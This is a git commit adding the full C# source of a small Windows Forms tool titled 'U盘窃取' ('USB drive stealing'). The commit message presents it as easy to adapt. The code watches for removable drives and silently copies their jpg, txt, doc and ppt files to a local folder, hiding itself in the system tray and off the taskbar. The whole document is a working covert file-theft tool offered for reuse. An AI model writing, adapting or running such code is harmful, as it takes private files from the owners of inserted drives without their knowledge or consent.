aff307bf7ccf95eaf9acb3ab032b25bd8059bf4c
YY <yuyang34880@163.com>
2016-04-08 19:15:40 +0800

    好早之前写的小东西，U盘插入时自动复制出指定文件，改造一下很方便

---
+++ Upan/Form1.Designer.cs
@@ -0,0 +1,181 @@
+﻿namespace Upan
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// 必需的设计器变量。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 清理所有正在使用的资源。
+        /// </summary>
+        /// <param name="disposing">如果应释放托管资源，为 true；否则为 false。</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows 窗体设计器生成的代码
+
+        /// <summary>
+        /// 设计器支持所需的方法 - 不要
+        /// 使用代码编辑器修改此方法的内容。
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.cbJPG = new System.Windows.Forms.CheckBox();
+            this.cbTXT = new System.Windows.Forms.CheckBox();
+            this.cbDOC = new System.Windows.Forms.CheckBox();
+            this.cbPPT = new System.Windows.Forms.CheckBox();
+            this.gbType = new System.Windows.Forms.GroupBox();
+            this.groupBox1 = new System.Windows.Forms.GroupBox();
+            this.btnBrowser = new System.Windows.Forms.Button();
+            this.txtCopyPath = new System.Windows.Forms.TextBox();
+            this.folderBrowserDialog1 = new System.Windows.Forms.FolderBrowserDialog();
+            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
+            this.gbType.SuspendLayout();
+            this.groupBox1.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // cbJPG
+            // 
+            this.cbJPG.AutoSize = true;
+            this.cbJPG.Checked = true;
+            this.cbJPG.CheckState = System.Windows.Forms.CheckState.Checked;
+            this.cbJPG.Location = new System.Drawing.Point(33, 20);
+            this.cbJPG.Name = "cbJPG";
+            this.cbJPG.Size = new System.Drawing.Size(42, 16);
+            this.cbJPG.TabIndex = 1;
+            this.cbJPG.Text = "jpg";
+            this.cbJPG.UseVisualStyleBackColor = true;
+            // 
+            // cbTXT
+            // 
+            this.cbTXT.AutoSize = true;
+            this.cbTXT.Checked = true;
+            this.cbTXT.CheckState = System.Windows.Forms.CheckState.Checked;
+            this.cbTXT.Location = new System.Drawing.Point(130, 20);
+            this.cbTXT.Name = "cbTXT";
+            this.cbTXT.Size = new System.Drawing.Size(42, 16);
+            this.cbTXT.TabIndex = 2;
+            this.cbTXT.Text = "txt";
+            this.cbTXT.UseVisualStyleBackColor = true;
+            // 
+            // cbDOC
+            // 
+            this.cbDOC.AutoSize = true;
+            this.cbDOC.Checked = true;
+            this.cbDOC.CheckState = System.Windows.Forms.CheckState.Checked;
+            this.cbDOC.Location = new System.Drawing.Point(33, 54);
+            this.cbDOC.Name = "cbDOC";
+            this.cbDOC.Size = new System.Drawing.Size(42, 16);
+            this.cbDOC.TabIndex = 3;
+            this.cbDOC.Text = "doc";
+            this.cbDOC.UseVisualStyleBackColor = true;
+            // 
+            // cbPPT
+            // 
+            this.cbPPT.AutoSize = true;
+            this.cbPPT.Checked = true;
+            this.cbPPT.CheckState = System.Windows.Forms.CheckState.Checked;
+            this.cbPPT.Location = new System.Drawing.Point(130, 54);
+            this.cbPPT.Name = "cbPPT";
+            this.cbPPT.Size = new System.Drawing.Size(42, 16);
+            this.cbPPT.TabIndex = 4;
+            this.cbPPT.Text = "ppt";
+            this.cbPPT.UseVisualStyleBackColor = true;
+            // 
+            // gbType
+            // 
+            this.gbType.Controls.Add(this.cbPPT);
+            this.gbType.Controls.Add(this.cbJPG);
+            this.gbType.Controls.Add(this.cbDOC);
+            this.gbType.Controls.Add(this.cbTXT);
+            this.gbType.Location = new System.Drawing.Point(12, 12);
+            this.gbType.Name = "gbType";
+            this.gbType.Size = new System.Drawing.Size(314, 85);
+            this.gbType.TabIndex = 5;
+            this.gbType.TabStop = false;
+            this.gbType.Text = "复制格式";
+            // 
+            // groupBox1
+            // 
+            this.groupBox1.Controls.Add(this.btnBrowser);
+            this.groupBox1.Controls.Add(this.txtCopyPath);
+            this.groupBox1.Location = new System.Drawing.Point(12, 103);
+            this.groupBox1.Name = "groupBox1";
+            this.groupBox1.Size = new System.Drawing.Size(314, 77);
+            this.groupBox1.TabIndex = 6;
+            this.groupBox1.TabStop = false;
+            this.groupBox1.Text = "路径";
+            // 
+            // btnBrowser
+            // 
+            this.btnBrowser.Location = new System.Drawing.Point(6, 47);
+            this.btnBrowser.Name = "btnBrowser";
+            this.btnBrowser.Size = new System.Drawing.Size(75, 23);
+            this.btnBrowser.TabIndex = 1;
+            this.btnBrowser.Text = "浏览";
+            this.btnBrowser.UseVisualStyleBackColor = true;
+            this.btnBrowser.Click += new System.EventHandler(this.btnBrowser_Click);
+            // 
+            // txtCopyPath
+            // 
+            this.txtCopyPath.Location = new System.Drawing.Point(6, 20);
+            this.txtCopyPath.Name = "txtCopyPath";
+            this.txtCopyPath.ReadOnly = true;
+            this.txtCopyPath.Size = new System.Drawing.Size(302, 21);
+            this.txtCopyPath.TabIndex = 0;
+            this.txtCopyPath.Text = "C:\\\\Copy";
+            // 
+            // notifyIcon1
+            // 
+            this.notifyIcon1.Icon = ((System.Drawing.Icon)(resources.GetObject("notifyIcon1.Icon")));
+            this.notifyIcon1.Text = "U盘窃取";
+            this.notifyIcon1.Visible = true;
+            this.notifyIcon1.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.notifyIcon1_MouseDoubleClick);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(341, 303);
+            this.Controls.Add(this.groupBox1);
+            this.Controls.Add(this.gbType);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.ShowInTaskbar = false;
+            this.Text = "U盘窃取";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.SizeChanged += new System.EventHandler(this.Form1_SizeChanged);
+            this.gbType.ResumeLayout(false);
+            this.gbType.PerformLayout();
+            this.groupBox1.ResumeLayout(false);
+            this.groupBox1.PerformLayout();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.CheckBox cbJPG;
+        private System.Windows.Forms.CheckBox cbTXT;
+        private System.Windows.Forms.CheckBox cbDOC;
+        private System.Windows.Forms.CheckBox cbPPT;
+        private System.Windows.Forms.GroupBox gbType;
+        private System.Windows.Forms.GroupBox groupBox1;
+        private System.Windows.Forms.Button btnBrowser;
+        private System.Windows.Forms.TextBox txtCopyPath;
+        private System.Windows.Forms.FolderBrowserDialog folderBrowserDialog1;
+        private System.Windows.Forms.NotifyIcon notifyIcon1;
+    }
+}
+
---
+++ Upan/Form1.cs
@@ -0,0 +1,205 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Text;
+using System.Windows.Forms;
+
+namespace Upan
+{
+    public partial class Form1 : Form
+    {
+        public const int WM_DEVICECHANGE = 0x219;//U盘插入后，OS的底层会自动检测到，然后向应用程序发送“硬件设备状态改变“的消息
+        public const int DBT_DEVICEARRIVAL = 0x8000;  //就是用来表示U盘可用的。一个设备或媒体已被插入一块，现在可用。
+        public const int DBT_CONFIGCHANGECANCELED = 0x0019;  //要求更改当前的配置（或取消停靠码头）已被取消。
+        public const int DBT_CONFIGCHANGED = 0x0018;  //当前的配置发生了变化，由于码头或取消固定。
+        public const int DBT_CUSTOMEVENT = 0x8006; //自定义的事件发生。 的Windows NT 4.0和Windows 95：此值不支持。
+        public const int DBT_DEVICEQUERYREMOVE = 0x8001;  //审批要求删除一个设备或媒体作品。任何应用程序也不能否认这一要求，并取消删除。
+        public const int DBT_DEVICEQUERYREMOVEFAILED = 0x8002;  //请求删除一个设备或媒体片已被取消。
+        public const int DBT_DEVICEREMOVECOMPLETE = 0x8004;  //一个设备或媒体片已被删除。
+        public const int DBT_DEVICEREMOVEPENDING = 0x8003;  //一个设备或媒体一块即将被删除。不能否认的。
+        public const int DBT_DEVICETYPESPECIFIC = 0x8005;  //一个设备特定事件发生。
+        public const int DBT_DEVNODES_CHANGED = 0x0007;  //一种设备已被添加到或从系统中删除。
+        public const int DBT_QUERYCHANGECONFIG = 0x0017;  //许可是要求改变目前的配置（码头或取消固定）。
+        public const int DBT_USERDEFINED = 0xFFFF;  //此消息的含义是用户定义的
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        protected override void WndProc(ref Message m)
+        {
+            string typess = "";
+            string[] types;
+            foreach (Control c in gbType.Controls)
+            {
+                if (c is CheckBox)
+                {
+                    CheckBox cb = (CheckBox)c;
+                    if (cb.Checked == true)
+                    {
+                        typess += cb.Text + ",";
+                    }
+                }
+            }
+
+            try
+            {
+                if (m.Msg == WM_DEVICECHANGE)
+                {
+                    switch (m.WParam.ToInt32())
+                    {
+                        case WM_DEVICECHANGE:
+                            break;
+                        case DBT_DEVICEARRIVAL://U盘插入
+                            {
+                                DriveInfo[] uin = DriveInfo.GetDrives();
+                                foreach (DriveInfo drive in uin)
+                                {
+                                    if (drive.DriveType == DriveType.Removable)
+                                    {
+                                        //MessageBox.Show("U盘已插入，盘符为:" + drive.Name.ToString());
+                                        if (!String.IsNullOrEmpty(typess))
+                                        {
+                                            types = typess.Trim(',').Split(',');
+                                            string copypath = txtCopyPath.Text.Trim();
+
+                                            if (Directory.Exists(copypath) == false)
+                                            {
+                                                Directory.CreateDirectory(copypath);
+                                            }
+                                            copyFile(drive.Name.ToString(), types, copypath);
+                                        }
+                                        break;
+                                    }
+                                }
+                                break;
+                            }
+                        case DBT_CONFIGCHANGECANCELED:
+                            break;
+                        case DBT_CONFIGCHANGED:
+                            break;
+                        case DBT_CUSTOMEVENT:
+                            break;
+                        case DBT_DEVICEQUERYREMOVE:
+                            break;
+                        case DBT_DEVICEQUERYREMOVEFAILED:
+                            break;
+                        case DBT_DEVICEREMOVECOMPLETE: //U盘卸载
+                            {
+                                // MessageBox.Show("U盘被拔出！");
+                                break;
+                            }
+                        case DBT_DEVICEREMOVEPENDING:
+                            break;
+                        case DBT_DEVICETYPESPECIFIC:
+                            break;
+                        case DBT_DEVNODES_CHANGED:
+                            break;
+                        case DBT_QUERYCHANGECONFIG:
+                            break;
+                        case DBT_USERDEFINED:
+                            break;
+                        default:
+                            break;
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+            base.WndProc(ref m);
+        }
+
+        private void copyFile(string drivePath, string[] types, string copypath)
+        {
+            DirectoryInfo[] dirs = new DirectoryInfo(drivePath).GetDirectories();
+            foreach (DirectoryInfo dir in dirs)
+            {
+                FileInfo[] files = dir.GetFiles();
+                foreach (FileInfo file in files)
+                {
+                    string name = file.Name.ToString();
+                    string type = name.Substring(name.LastIndexOf('.') + 1);
+
+                    foreach (string typ in types)
+                    {
+                        if (type.ToLower() == typ)
+                        {
+                            file.CopyTo(copypath + "\\" + file.Name.ToString());
+                        }
+                    }
+
+                }
+                copyFile(dir.FullName, types, copypath);
+            }
+
+        }
+
+        private void btnBrowser_Click(object sender, EventArgs e)
+        {
+            folderBrowserDialog1.ShowDialog();
+            txtCopyPath.Text = folderBrowserDialog1.SelectedPath.ToString();
+        }
+
+        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
+        {
+            this.Visible = true; //显示窗体
+            WindowState = FormWindowState.Normal;  //恢复窗体默认大小
+        }
+
+        private void Form1_SizeChanged(object sender, EventArgs e)
+        {
+            if (WindowState == FormWindowState.Minimized)
+            {
+                this.Hide();
+                //图标显示在托盘区 
+                notifyIcon1.Visible = true;
+            }
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            string typess = "";
+            string[] types;
+            foreach (Control c in gbType.Controls)
+            {
+                if (c is CheckBox)
+                {
+                    CheckBox cb = (CheckBox)c;
+                    if (cb.Checked == true)
+                    {
+                        typess += cb.Text + ",";
+                    }
+                }
+            }
+
+            DriveInfo[] s = DriveInfo.GetDrives();
+            foreach (DriveInfo i in s)
+            {
+                if (i.DriveType == DriveType.Removable)
+                {
+                    if (!String.IsNullOrEmpty(typess))
+                    {
+                        types = typess.Trim(',').Split(',');
+                        string copypath = txtCopyPath.Text.Trim();
+
+                        if (Directory.Exists(copypath) == false)
+                        {
+                            Directory.CreateDirectory(copypath);
+                        }
+                        copyFile(i.Name.ToString(), types, copypath);
+                    }
+                }
+            }
+
+        }
+
+
+
+    }
+}
